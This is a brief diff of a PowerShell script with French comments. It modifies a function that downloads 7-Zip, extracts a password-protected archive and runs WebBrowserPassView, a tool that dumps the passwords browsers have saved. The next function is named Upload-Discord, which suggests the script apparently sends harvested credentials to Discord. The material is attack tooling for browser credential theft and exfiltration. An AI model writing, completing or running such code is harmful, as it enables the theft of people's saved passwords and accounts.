@@ -60,14 +60,15 @@ function Get-Nirsoft {
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
 
-    # Utiliser Echo pour envoyer le mot de passe à 7-Zip via l'entrée standard
-    Echo $zipPassword | .\7z\7za.exe x wbpv.zip -si -ttar | .\7z\7za.exe x -aoa -ttar -si -oC:\temp\
-
+    # Utiliser Start-Process pour lancer la commande avec le mot de passe redirigé via stdin
+    Start-Process -FilePath ".\7z\7za.exe" -ArgumentList "e wbpv.zip" -RedirectStandardInput "C:\temp\password.txt" -Wait
+    
     # Pause de 5 secondes
     Start-Sleep -Seconds 5
     
     .\WebBrowserPassView.exe
 }
+
 
 # Function to upload content to Discord
 function Upload-Discord {
